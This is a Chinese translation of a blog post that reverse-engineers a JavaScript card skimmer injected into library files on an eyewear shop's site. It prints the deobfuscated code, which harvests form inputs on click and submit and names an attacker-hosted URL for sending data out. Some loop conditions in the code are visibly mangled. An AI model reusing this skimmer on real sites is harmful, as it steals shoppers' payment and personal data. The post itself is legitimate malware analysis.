`原文：https://blog.jse.li/posts/marveloptics-malware/`
摘要：这段被注入的脚本偷取结账表单数据并将其发送到中国人持有的域名，但是攻击者的编程技术真的很烂。
最近，我妈妈在网上寻找一副新的眼镜。而当访问到 `marveloptics.com`
的时候，她的杀毒软件开始弹出恶意Javascript的警告。我总是很好奇现实生活中的攻击是如何运作的，我便对它实施逆向工程。  
文件可以在 [Github仓库](https://github.com/veggiedefender/marveloptics_malware)找到。
## 恶意代码位置
这些攻击者把他们的代码注入到像modernizr和openid的库，这样做有一些好处：
  * 库包含压缩过的代码，这让混淆过的恶意代码很难被发现。
  * 因为开发者很少升级他们的依赖库，被注入的代码会在应用代码升级的时候继续存在。
## 反混淆
文件：  
[modernizr.js](https://github.com/veggiedefender/marveloptics_malware/blob/master/original/modernizr.js)  
[openid.js](https://github.com/veggiedefender/marveloptics_malware/blob/master/original/modernizr.js)
它们包含完全相同的代码，并且很明显都是用[javascriptobfuscator.com](http://javascriptobfuscator.com)这类工具混淆过的。
幸运的是，`js-beautify`专门对这些脚本进行反混淆处理。
`$ js-beautify -x -s 2 original/op`
处理后的代码：
    var i3692386a609ff6fd204a1418521ec651 = {
      snd: null,
      o7d6e88f271f3ac078a708f7123e10e14: "https://webfotce.me/js/form.js",
      myid: (function(_0x79e5x2) {
        var _0x79e5x3 = document["cookie"]["match"](new RegExp("(?:^|; )" + _0x79e5x2["replace"](/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
        return _0x79e5x3 ? decodeURIComponent(_0x79e5x3[1]) : undefined
      })("setidd") || (function() {
        var _0x79e5x4 = new Date();
        var _0x79e5x5 = _0x79e5x4["getTime"]() + "-" + Math["floor"](Math["random"]() * (999999999 - 11111111 + 1) + 11111111);
        var _0x79e5x6 = new Date(new Date()["getTime"]() + 60 * 60 * 24 * 1000);
        document["cookie"] = "setidd=" + _0x79e5x5 + "; path=/; expires=" + _0x79e5x6["toUTCString"]();
        return _0x79e5x5
      })(),
      clk: function() {
        i3692386a609ff6fd204a1418521ec651["snd"] = null;
        var _0x79e5x7 = document["querySelectorAll"]("input, select, textarea, checkbox, button");
        for (var _0x79e5x8 = 0; _0x79e5x8  0) {
            var _0x79e5x9 = _0x79e5x7[_0x79e5x8]["name"];
            if (_0x79e5x9 == "") {
              _0x79e5x9 = _0x79e5x8
            };
            i3692386a609ff6fd204a1418521ec651["snd"] += _0x79e5x7[_0x79e5x8]["name"] + "=" + _0x79e5x7[_0x79e5x8]["value"] + "&"
          }
        }
      },
      send: function() {
        try {
          var _0x79e5xa = document["querySelectorAll"]("a[href*=\'javascript:void(0)\'],button, input, submit, .btn, .button");
          for (var _0x79e5x8 = 0; _0x79e5x8  0) {
            var name = elements[i].name;
            if (name == "") {
              name = i;
            };
            Malware.data += elements[i].name + "=" + elements[i].value + "&";
          }
        }
      },
      send: function() {
        try {
          // //当用户点击任意按钮或表单输入时，运行stealData()
          var elements = document.querySelectorAll("a[href*=\'javascript:void(0)\'],button, input, submit, .btn, .button");
          for (var i = 0; i < elements.length; i++) {
            var element = elements[i];
            if (element.type != "text" && element.type != "select" && element.type != "checkbox" && element.type != "password" && element.type != "radio") {
              if (element.addEventListener) {
                element.addEventListener("click", Malware.stealData, false);
              } else {
                element.attachEvent("onclick", Malware.stealData);
              }
            }
          };
          // 当用户提交一个表单时，运行stealData()
          var formElements = document.querySelectorAll("form");
          for (vari = 0; i < formElements.length; i++) { //是的，这里是他们的拼写错误！
            if (formElements[i].addEventListener) {
              formElements[i].addEventListener("submit", Malware.stealData, false);
            } else {
              formElements[i].attachEvent("onsubmit", Malware.stealData);
            }
          };
         // 如果有待发送数据，那么将其发送到预定义的Url
          if (Malware.data != null) {
            var hostname = location.hostname.split(".").slice(0).join("_") || "nodomain";